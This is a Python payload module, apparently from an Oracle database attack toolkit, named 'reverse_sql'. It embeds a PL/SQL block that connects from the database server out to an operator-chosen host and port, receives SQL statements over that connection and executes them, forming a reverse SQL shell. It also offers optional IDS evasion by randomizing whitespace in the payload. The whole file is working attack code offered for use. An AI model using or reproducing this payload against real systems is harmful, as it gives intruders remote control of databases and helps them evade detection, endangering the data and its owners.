#!/usr/bin/python

"""
NOTE: Should be rewritten from scratch!!!!
"""

import sys

sys.path.append("../../lib")
sys.path.append("../lib")
sys.path.append("lib")

import run_command
from oracleids import randomizeSpaces

data = """
DECLARE
  data varchar2(32767);
  v_ret varchar2(32767);
  len number;
  conn utl_tcp.connection;
BEGIN
  conn := utl_tcp.open_connection(remote_host => '%HOST%', remote_port => %PORT%, charset => 'US7ASCII');

  loop
    data := utl_tcp.get_line(conn);
    data := substr(data, 1, length(data)-1);

    if lower(data) = 'exit' then
      exit;
    else
      begin
        if lower(data) like 'select%' then
          execute immediate data into v_ret;
        else
          execute immediate data;
          v_ret := 'Statement executed';
        end if;
        len := utl_tcp.write_line(conn, 'RET:' || v_ret);
      exception
        when others then
          len := utl_tcp.write_line(conn, 'ERROR: ' || sqlcode || ' - ' || sqlerrm);
      end;
    end if;

    dbms_output.put_line('"' || data || '"');
  end loop;

  utl_tcp.close_connection(conn);
END;
"""

name = "reverse_sql"
brief_description = "Run a blind reverse SQL terminal"

class CPayload:

    user = "TEST"
    function = "F1"
    useDML = False
    covert = 0
    verifyCommand = ""
    connection = None
    type = 0

    host = ""
    port = ""
    
    connection = None

    def __init__(self):
        pass

    def run(self):
        global data

        tmp = data
        tmp = tmp.replace("%USER%", self.user)

        if self.host == "":
            self.host = raw_input("Host to connect: ")
        
        if self.port == "":
            self.port = raw_input("Port to listen: ")

        tmp = tmp.replace("%HOST%", self.host)
        tmp = tmp.replace("%PORT%", self.port)

        if self.covert > 0:
            # Currently only one IDS evasion technique is used
            tmp = randomizeSpaces(tmp)

        objRun = run_command.CPayload()
        objRun.idsTechniques = self.covert
        objRun.user = self.user
        objRun.command = tmp
        ret = objRun.run()

        return ret
    
    def verify(self, connection):
        sql = self.verifyCommand
        cursor = connection.cursor()
        cursor.execute(sql)
        
        for x in cursor.fetchall():
            return True
        
        return False

def main():
    import cx_Oracle

    a = CPayload()
    a.idsTechniques = 1
    cmd = a.run()

    print cmd

if __name__ == "__main__":
    main()
 
